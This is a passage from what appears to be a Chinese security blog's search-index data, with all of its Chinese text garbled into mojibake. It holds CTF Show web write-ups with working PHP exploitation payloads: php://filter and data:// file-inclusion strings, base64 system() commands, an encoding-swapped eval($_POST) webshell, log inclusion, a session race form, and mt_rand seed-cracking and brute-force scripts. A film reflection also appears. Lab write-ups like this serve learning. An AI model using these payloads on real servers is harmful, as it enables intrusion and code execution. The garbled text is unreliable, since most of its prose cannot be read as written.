sessionï¼Œè€Œäº§ç”Ÿäº†ä¸€ä¸ªé”®å€¼ï¼Œè¯¥é”®å€¼ç”± ini.get(&quot;session.upload_progress.prefix&quot;)+æˆ‘ä»¬æ„é€ çš„session.upload_progress.name ä¸€èµ·ç»„æˆï¼Œæœ€ç»ˆå†™å…¥ sess_æ–‡ä»¶ lié‡Œã€‚ linux ä¸‹ï¼Œsessionæ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®æ˜¯ /tmp æˆ– /var/lib/php/session é¿å… session.upload_progress.cleanup=on çš„å¹²æ‰° è¯¥é€‰é¡¹å¯¼è‡´æ–‡ä»¶æˆåŠŸä¸Šä¼ ä¹‹åï¼Œä¸€æ—¦è¯»å– POST ä¿¡æ¯ä¹‹åï¼Œä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œsession æ–‡ä»¶å°†ä¼šè¢«ç«‹å³æ¸…ç†ã€‚é‡ç‚¹æ˜¯ è¯¥é€‰é¡¹é»˜è®¤å¼€å¯ã€‚ æ–¹æ³•ï¼šæ¡ä»¶ç«äº‰ 1.6 Web 87 â€” è¿‡æ»¤ phpã€dataã€: ã€. â€” æ­»äº¡ç»•è¿‡1if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;.$content); &#125;else&#123; highlight_file(__FILE__);&#125; 1# post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== æ˜¯ &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php 1# php://filter/write=convert.base64-decode/resource=1.php# è¿›è¡Œ urlåŒç¼–ç # get?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 1# æ›´æ”¹ content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#è§£ç æ˜¯ &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt; è®¿é—®å¾—åˆ° 1.7 Web 88 â€” è¿‡æ»¤ + = â€” æ‹¼å‡‘ php è¯­å¥1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# æ³¨æ„ä¸èƒ½å‡ºç°= å’Œ +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi è§£ç æ˜¯ &lt;?php system(&#x27;ls&#x27;); ?&gt;ab 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h# PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h è§£ç æ˜¯ &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a 1.8 Web 117 â€” convert.iconv.* + æ­»äº¡ç»•è¿‡1&lt;?php highlight_file(__FILE__);error_reporting(0);function filter($x)&#123; if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); 1# è¿‡æ»¤æ‰äº†æˆ‘ä»¬å¸¸ä½¿ç”¨çš„è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ«çš„ ä¾‹å¦‚ï¼šconvert.iconv.* å®ƒçš„ç¼–ç è§£ç ä¸å‡½æ•° iconv() ä¸€è‡´ https://blog.csdn.net/qq_44657899/article/details/109319686 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;); # ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# postab=system(&#x27;cat flag.php&#x27;); 1.9 Web 116 â€”misc+lfi å°†è§†é¢‘ åœ¨ Kali ä¸‹è¿›è¡Œ binwalk 1binwalk -e 1.pngbinbalk -D=png 1.mp4 # è·å–å›¾ç‰‡ ç„¶åç›´æ¥ ?file=php://filter/resource=flag.php å³å¯ ï¼Œä½†éœ€è¦æŸ¥çœ‹æºç ï¼Œé¡µé¢ä¸ŠæŸ¥çœ‹ä¸äº†ï¼Œæˆ‘ä»¬å¯ä»¥æŠ“åŒ…æŸ¥çœ‹ äºŒã€æ€»ç»“æ–‡ä»¶åŒ…å« include() å‡½æ•° è¯»æ–‡ä»¶ 1?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;#æŸ¥çœ‹æºä»£ç ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=å†…å®¹æ˜¯&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?php system(&#x27;ls&#x27;); å†™æ–‡ä»¶ 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# è¿‡æ»¤ php data : Web 80-81# æ—¥å¿—åŒ…å«?file=/var/log/nginx/access.log # å‘é€åŒ…æ—¶å†™å…¥ ä»£ç # è¿‡æ»¤ . Web 82-86# SESSION åŒ…å« æ¡ä»¶ç«äº‰&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;æ­»äº¡ç»•è¿‡ Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# è¿‡æ»¤ + = é™åˆ¶ base64 Web 88# æ‹¼å‡‘ php è¯­å¥?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi è§£ç æ˜¯ &lt;?php system(&#x27;ls&#x27;); ?&gt;ab å‚è€ƒ https://blog.csdn.net/weixin_45882317/article/details/114576726","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-çˆ†ç ´","slug":"CTF-Show-çˆ†ç ´","date":"2021-10-01T11:10:35.000Z","updated":"2021-10-07T10:15:09.899Z","comments":true,"path":"2021/10/01/CTF-Show-çˆ†ç ´/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/","excerpt":"CTF show çˆ†ç ´ç¯‡ã€‚","text":"CTF show çˆ†ç ´ç¯‡ã€‚ ä¸€ã€CTF show â€” çˆ†ç ´1.1 Web 21 â€” Burp çˆ†ç ´ â€” base64-encode1çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“ æŠ“åŒ…æŸ¥çœ‹ï¼šè¾“å…¥çš„è´¦å·å¯†ç éƒ½è¢«base64åŠ å¯†äº†ï¼Œå¹¶ä¸”ä¸­é—´è¿˜æœ‰ä¸€ä¸ª : åˆ†å‰² Burp æŠ“åŒ…ï¼Œä¸‹è½½é¢˜ç›®ç»™çš„å­—å…¸ï¼Œè¿›è¡Œçˆ†ç ´ï¼šæ‰‹åŠ¨æ›´æ”¹ admin: base64 åŠ å¯†ä¹‹åçš„å†…å®¹ï¼Œåªå°†å¯†ç éƒ¨åˆ†è®¾ä¸ºå˜é‡ï¼ŒåŠ è½½é¢˜ç›®å­—å…¸ï¼Œè®¾ç½® base64-encode åŠ å¯†ï¼Œå»æ‰å‹¾é€‰ URLç¼–ç ï¼Œå¼€å§‹æ”»å‡»ã€‚ 1.2 Web 22 â€” å­åŸŸåçˆ†ç ´ â€” subDomainBrute å·¥å…·1åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå subDomainBrute å·¥å…·å­åŸŸåçˆ†ç ´ è®¿é—® http://flag.ctfer.com/index.php 1.3 Web 23 â€” æ ¹æ®ä»£ç è¦æ±‚å†™è„šæœ¬1è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼ 1234567891011121314&lt;?php error_reporting(0); include(&#x27;flag.php&#x27;); if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125; &#125;else&#123; highlight_file(__FILE__); &#125;?&gt; åˆ†æï¼š 12intval(mixed $var [, int $base = 10 ]) å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ è„šæœ¬ï¼šå¦‚æœæ˜¯ äºŒä½æ•° 1234567891011121314151617&lt;?php error_reporting(0); $a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;for($i=0;$i&lt;36;$i++)&#123; for($j=0;$j&lt;36;$j++)&#123; $token=$a[$i].$a[$j]; $token = md5($token); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $a[$i].$a[$j]; exit(0); &#125; &#125; &#125;&#125; ?&gt; # å¾—åˆ° 3j è„šæœ¬ï¼šå¦‚æœæ˜¯ ä¸‰ä½æ•° 12345678910111213141516171819&lt;?phperror_reporting(0);$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;print (strlen($string).&quot;\\n&quot;);for ($a = 0; $a &lt; 62; $a++) &#123; for ($b = 0; $b &lt; 62; $b++) &#123; for ($c = 0; $c &lt; 62; $c++) &#123; $flag = $string[$a] . $string[$b] . $string[$c]; $token = md5($flag); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag . &quot;\\n&quot;; &#125; &#125; &#125; &#125;&#125;# å¾—åˆ° 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE 1.4 Web 24 â€” php ä¼ªéšæœºæ•° â€” mt_srand()1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125;?&gt; æµ‹è¯•ï¼š 1&lt;?phpmt_srand(372619038);echo(mt_rand());?&gt;# å¾—åˆ° 1155388967 ä¼ªéšæœºæ•°æ¼æ´ï¼šå½“ç§å­ä¸å˜æ—¶ï¼Œå®é™…ä¸Šç”Ÿæˆçš„éšæœºæ•°æ˜¯å›ºå®šçš„ã€‚ 1.5 Web 25 â€” php ä¼ªéšæœºæ•° é€†æ¨ç§å­ â€” php_mt_seed å·¥å…·ä½¿ç”¨https://www.cnblogs.com/zaqzzz/p/9997855.html çŸ¥é“ç§å­ï¼Œå¯ä»¥ç¡®å®šä½ è¾“å‡ºä¼ªéšæœºæ•°çš„åºåˆ— çŸ¥é“éšæœºæ•°åºåˆ—ï¼Œå€’è¿‡æ¥ä¹Ÿå¯ä»¥ç¡®å®šä½ çš„ç§å­ï¼Œå¦‚ä½•ç¡®å®šï¼Ÿ å·¥å…· php_mt_seed 1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; åˆ†æï¼š 1hexdec() å‡½æ•°æŠŠåå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚mt_srand(hexdec(substr(md5($flag), 0,8))); #ç¡®å®š ç§å­$rand = intval($r)-intval(mt_rand()); #å¾—åˆ°éšæœºæ•°ï¼Œä¸ä¼ å…¥çš„ ?r æœ‰å…³å¦‚æœè¯¥éšæœºæ•°ä¸å­˜åœ¨ï¼Œåˆ™è¾“å‡º $randå¦‚æœè¯¥éšæœºæ•°å­˜åœ¨ï¼Œå¹¶ä¸” $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) åˆ™è¾“å‡º $flag**ä»£ç åˆ†æ** é‚£ä¹ˆç”Ÿæˆçš„éšæœºæ•°ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼ å…¥çš„ r æœ‰å…³ï¼Œè€Œ r æˆ‘ä»¬å¯æ§ é€šè¿‡ç”Ÿæˆçš„éšæœºæ•°è¿›è¡Œé€†æ¨å¯ä»¥å¾—åˆ°ç§å­ï¼Œå·¥å…· php_mt_seed è¿˜è¦æ³¨æ„çš„æ˜¯ï¼š 1å¾—åˆ° $flag çš„æ¡ä»¶ï¼š1. !$rand å³ $rand ä¸å­˜åœ¨2. $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¾—è®¡ç®—å‡º token çš„å€¼ï¼Œç„¶åå‘åŒ…çš„æ—¶å€™è¦è¿›è¡Œä¿®æ”¹ å¦‚ä½•ç¡®ä¿ $rand ä¸å­˜åœ¨ ï¼Ÿ æµ‹è¯• å½“æˆ‘ä»¬è®¾ç½®äº†ç§å­ä¹‹å mt_srand ï¼Œæˆ‘ä»¬åªè¦ä¼  åŒæ ·çš„ r ï¼Œé‚£ä¹ˆæœ€ç»ˆå¾—åˆ°çš„ $rand éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆåè¿‡æ¥ï¼Œå¦‚æœ æˆ‘ä»¬ä¼ å…¥ ?r=522258682 ï¼Œé‚£æœ€ç»ˆå°±å¯ä»¥å¾—åˆ° $rand = 0 é‚£ç°åœ¨æˆ‘ä»¬å°±å¾—è¦è®¡ç®— (mt_rand()+mt_rand()) äº† è¦è®¡ç®—ç”Ÿæˆçš„éšæœºæ•°ä¹‹å’Œï¼Œé¦–å…ˆå¾—å…ˆç¡®å®šç§å­æ‰è¡Œå•Š ä½¿ç”¨å·¥å…· php_mt_seed 1git clone https://github.com/otukijoe/php_mt_seed.git 1maketime ./php_mt_seed 1446899118 é€šè¿‡æŠ“åŒ…å¯ä»¥çŸ¥é“ è¯¥ php ç‰ˆæœ¬æ˜¯ PHP/7.3.11 è®¡ç®— token å€¼ï¼š 1&lt;?phphighlight_file(__FILE__);mt_srand(1048340704);echo mt_rand().&quot;\\n&quot;;echo mt_rand()+mt_rand().&quot;\\n&quot;;//1446899118 219330488?&gt; æŠ“åŒ…æ”¹å€¼ 1.6 Web 26 1 æŸ¥çœ‹æºç  1.7 Web 27 â€” èº«ä»½è¯çˆ†ç ´ æˆ‘ä»¬éœ€è¦çˆ†ç ´å‡º å­¦ç”Ÿçš„å‡ºç”Ÿæ—¥æœŸ Burp ä¸Šé¢å¯ä»¥çœ‹åˆ°è¯¥å¹³å°æ˜¯ 1999-2017 å¹´çš„ï¼Œé‚£ä¹ˆä½œä¸ºå¤§å­¦ç”Ÿæ­¤æ—¶åº”è¯¥åå…«ä¹å²ï¼Œæ‰€ä»¥ä»–ä»¬åº”è¯¥æ˜¯1980 å¹´ä¹‹åçš„åŸºæœ¬ä¸Š é‚£ä¹ˆæˆ‘ä»¬å°±ä» 1980 å¹´å¼€å§‹è®¾ç½® date å­—å…¸ ç„¶åæˆåŠŸæŸ¥è¯¢ï¼Œå¾—åˆ° æ­å–œæ‚¨ï¼Œæ‚¨å·²è¢«æˆ‘æ ¡å½•å–ï¼Œä½ çš„å­¦å·ä¸º02015237 åˆå§‹å¯†ç ä¸ºèº«ä»½è¯å·ç  1621022199002015237 02015237 æœ€åæˆåŠŸç™»å½•å³å¯ 1.8 Web 28 Url å½“ä¸­çš„ /0/1/ å°è¯•çˆ†ç ´ï¼Œå³å¯å¾—åˆ°","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"æ¶ä¹‹èŠ±æœ‰æ„Ÿ","slug":"æ¶ä¹‹èŠ±æœ‰æ„Ÿ","date":"2021-10-01T10:17:46.000Z","updated":"2021-10-01T11:44:54.831Z","comments":true,"path":"2021/10/01/æ¶ä¹‹èŠ±æœ‰æ„Ÿ/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/","excerpt":"","text":"å¦‚æœä½ çš„è‡³äº²çŠ¯äº†ç½ªï¼Œæ€äº†äººï¼Œåœ¨ä½ ç«¥å¹´ä¸€æ— æ‰€çŸ¥çš„æ—¶å€™ï¼Œå¯¹ä½ é€ æˆäº†éš¾ä»¥æƒ³è±¡çš„ä¼¤å®³ï¼Œä½ è¯¥å¦‚ä½•æ´»ä¸‹å»ï¼Ÿä½ èƒ½ç›¸ä¿¡ä¸€ä¸ªäººè¿™ä¸€è¾ˆå­åªä¸ºä¸€ä¸ªäººè€Œæ´»ç€å—ï¼Ÿæ¯å¤©å°±ä»…ä»…æ˜¯åšç€ç›¸åŒçš„äº‹æƒ…ï¼Œä»–æ˜¯ä¸€ä¸ªåˆæ ¼çš„ä¸ˆå¤«ï¼Œåˆæ ¼çš„çˆ¶äº²ï¼Œå¯ä»–çš„è¿‡å»æ˜¯è‡ªå·±å¯ä»¥é€‰æ‹©çš„å—ï¼Ÿå¦‚æœæ›å…‰ï¼Œä¸–äººä¼šæ€æœ«è¯´ï¼Œè¿ç¯æ€äººçŠ¯çš„å„¿å­ï¼Œå’Œè‡ªå·±çš„çˆ¶äº²ä¸€èµ·è®¡åˆ’æ€äººï¼Œåœ¨æ€äº†å¯¹è‡ªå·±æœ‰å…»è‚²ä¹‹æ©çš„äººä¹‹åé€ƒè·‘ï¼Œ18å¹´é‡Œä»æœªæ•è·ï¼Œéšåå‡å†’åˆ«äººçš„èº«ä»½ï¼Œå±…ç„¶ä¸ä¸€ä½åˆ‘è­¦ç»“å©šã€ç”Ÿå­ï¼Œè¿‡ç€æ™®é€šäººèˆ¬å¹³å‡¡çš„ç”Ÿæ´»ã€‚è€³æœµå¬åˆ°çš„ï¼Œç”µè§†æ–°é—»ä¸Šçœ‹åˆ°çš„ï¼Œä¸€å®šæ˜¯çœŸæ­£çš„å—ï¼Ÿè°ä¼šçŸ¥é“ï¼Œä»–ä¹Ÿæ˜¯åœ¨å¹´å¹¼æ—¶å¶ç„¶é—´ä»ç”µè§†ä¸Šæ‰å¾—çŸ¥ï¼Œè‡ªå·±æ˜¯æ€äººçŠ¯çš„å„¿å­å‘¢ï¼Œè°æœ‰ä¼šçŸ¥é“ï¼Œ18å¹´æ¥é€ƒè·‘çš„ä»–ï¼Œç«Ÿç„¶æ˜¯åœ¨æ›¿è‡ªå·±çš„å§å§æ´—æ¸…ç½ªåå‘¢ï¼Ÿè°åˆç›¸ä¿¡ä»–åªæ˜¯æƒ³æ™®æ™®é€šé€šå’Œè‡ªå·±çˆ±çš„äººä¸€è¾ˆå­å¹³å¹³æ·¡æ·¡çš„ç”Ÿæ´»ä¸‹å»å‘¢ï¼Ÿä¸ä¼šï¼Œä¸–äººä¸ä¼šï¼Œè­¦å¯Ÿä¸ä¼šï¼Œä»–åªæ˜¯æƒ³è¦ä¸ºå¥¹è€Œæ´»ï¼Œè€Œå¥¹ï¼Œç«Ÿç„¶åœ¨ç—›è‹¦ä¹‹ä¸­å¾—çŸ¥äº†æ‰€æœ‰çš„çœŸç›¸å´è¦ä¸å¾—ä¸ä»¥ç€è­¦å¯Ÿçš„èº«ä»½ï¼Œå¯¹ä»–æˆ´ä¸Šæ‰‹é“ã€‚ä»–æ²¡æœ‰åšé”™å•Šï¼Œä»–å¹´å°‘å—æ¬ºå—è¾±ï¼Œå´ä»æœªæ€äººï¼Œä»–å…·æœ‰äººæ ¼éšœç¢ï¼Œä¸ä¸ä»»ä½•äººäº²è¿‘ï¼Œä»–æ€»æ˜¯ä¸ºäº†ä¸€ç›˜å½•éŸ³ç£å¸¦ä¸åˆ«äººå¤§æ‰“å‡ºæ‰‹ï¼Œé‚£æ˜¯å› ä¸ºé‚£ä¸ªç£å¸¦ï¼Œæ˜¯ä»–æ¯äº²ç•™ç»™ä»–çš„å”¯ä¸€é—ç‰©å•Šï¼Œä»–æ€»æ˜¯ä¸€ä¸ªäººï¼Œåœ¨å®‰é™çš„åœ°æ–¹æ’ä¸Šè€³æœºå¬ç€ï¼Œä»–çš„è„¸è‰²ä¼šæ´‹æº¢èµ·å°‘æœ‰çš„ç¬‘å®¹ï¼Œé‚£æ˜¯å› ä¸ºï¼Œä»–åœ¨å¬è‡ªå·±å¦ˆå¦ˆçš„å£°éŸ³å•Šã€‚å¯è°çŸ¥é“ï¼Œé‚£å£°éŸ³ï¼Œå´æ˜¯æ— æ¯”å‡„æƒ¨ï¼Œè°å¬äº†éƒ½ä¼šçŸ¥é“ï¼Œé‚£ä»¿ä½›æ˜¯è¦ç¦»å¼€è¿™ä¸ªä¸–ç•Œçš„æœ€åçš„å“­æ³£ã€‚ä»–ä¸çŸ¥é“çˆ±æ˜¯ä»€ä¹ˆï¼Œä¸çŸ¥é“æ„¤æ€’æ˜¯ä»€ä¹ˆï¼Œå–œæ‚¦æ˜¯ä»€ä¹ˆï¼Œä¼¤å¿ƒæ˜¯ä»€ä¹ˆï¼Œä»–ä¸çŸ¥é“äººä»¬çš„æ‰€æœ‰æƒ…ç»ªçš„è¡¨ç°éƒ½æ˜¯æ€æ ·çš„ï¼Œä»–æ€»æ˜¯ä¸€å‰¯æ¯«æ— è¡¨æƒ…çš„è„¸ï¼Œä¸ä¼šå“­ï¼Œä¸ä¼šç¬‘ã€‚ä»–æœ¬æ¯«æ— ç›®çš„çš„ç”Ÿæ´»ï¼Œå¿å—ä¸–äººçš„æ¶è¯­ï¼Œè€Œå¾ˆå¹¸è¿ï¼Œä»–ï¼Œé‡è§äº†ï¼Œå¥¹ã€‚å¥¹ï¼Œæ¯”ä¸€èˆ¬çš„å¥³å­©å­éƒ½ä¸»åŠ¨ï¼Œå¥¹å¾ˆå¯çˆ±ï¼Œå¾ˆæ¼‚äº®ï¼Œå¥¹ä¸»åŠ¨å‘ä»–è¡¨ç™½ï¼Œå¯¹ä»–è¯´ï¼Œå¥¹ä¼šå¥½å¥½çˆ±ä»–ï¼Œæ¯å¤©éƒ½ä¼šå¤šä¸€ç‚¹ã€‚å¥¹ï¼Œä¸çŸ¥é“ä»–æ˜¯è°ã€‚ä»–ä»¬ï¼Œæœ‰äº†ï¼Œå®å®ã€‚ä»–ä¸ºäº†å¥¹ä»¬å»å­¦ä¹ å¹¸ç¦æ—¶è„¸ä¸Šä¼šæ´‹æº¢ç€çš„è¡¨æƒ…ï¼Œä»–æ¯å¤©æ—©èµ·ï¼Œåšé¥­ï¼Œæ¥é€å­©å­ä¸Šå­¦ï¼Œåœ¨è¿™ä¸ªå®¶é‡Œï¼Œä»–åšçš„å¾ˆå¥½ï¼Œå¯åœ¨ä¸–äººçœ¼é‡Œï¼Œä»–æ˜¯ä¸ªç½ªäººã€‚ä»–ä¸æ‡‚çˆ±æ˜¯ä»€ä¹ˆï¼Œå¯ä»–å´æ—©å·²æ·±æ·±åœ°çˆ±ç€å¥¹ã€‚å¥¹ï¼Œå¾—çŸ¥äº†çœŸç›¸ï¼Œå¥¹å¾ˆç—›è‹¦ï¼Œéš¾ä»¥æ‰¿å—ï¼Œå¥¹ç»ˆäºå¯¹ä»–è¯´å‡ºäº†ï¼Œæˆ‘ä»¬åˆ†å¼€å§ï¼Œæˆ‘ç°åœ¨å¾ˆè®¨åŒä½ ï¼Œæˆ‘ä»¬åˆ†å¼€å§ã€‚ä»–ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä»–å¾ˆéš¾è¿‡ï¼Œå´ä¸æ¸…æ¥šè‡ªå·±æ˜¯ä»€ä¹ˆæƒ…ç»ªï¼Œä»–ä¸æ¸…æ¥šè‡ªå·±å¯¹å¥¹çš„æ„Ÿæƒ…ï¼Œä¸çŸ¥é“ä»–ä»¬ä¹‹é—´å‡ºäº†ä»€ä¹ˆé—®é¢˜ã€‚ä»–æƒ³å•Šæƒ³ï¼Œæƒ³å•Šæƒ³ï¼Œåˆ°åº•ä»€ä¹ˆå¯ä»¥è®©å¥¹å¼€å¿ƒå‘¢ï¼Ÿäºæ˜¯ä»–å†³å®šï¼Œå¸®åŠ©å¥¹ï¼Œå†’ç€ç”Ÿå‘½å±é™©ï¼Œæ‰¾åˆ°çœŸå‡¶ã€‚ å³ä½¿ä¸æ„¿æˆä¸ºå¤ªé˜³ï¼Œå´ä¾ç„¶ç»šçƒ‚å¤ºç›®ã€‚","categories":[{"name":"å½±è§†æœ‰æ„Ÿ","slug":"å½±è§†æœ‰æ„Ÿ","permalink":"https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF Show---ä¿¡æ¯æœé›†","slug":"CTF-Show-ä¿¡æ¯æœé›†","date":"2021-10-01T09:20:33.000Z","updated":"2021-10-07T10:15:22.285Z","comments":true,"path":"2021/10/01/CTF-Show-ä¿¡æ¯æœé›†/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"CTF Show ä¸­ webå…¥é—¨ï¼Œä¿¡æ¯æœé›†ç¯‡ã€‚","text":"CTF Show ä¸­ webå…¥é—¨ï¼Œä¿¡æ¯æœé›†ç¯‡ã€‚ ä¸€ã€CTF Show â€” ä¿¡æ¯æœé›†1.1 Web1 â€” æŸ¥çœ‹æºä»£ç ç›´æ¥æŸ¥çœ‹æºä»£ç  1.2 Web 2 â€” æŸ¥çœ‹æºä»£ç 1jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ æŸ¥çœ‹æºä»£ç çš„å‡ ç§æ–¹å¼ å³é”®æŸ¥çœ‹æºä»£ç  F12 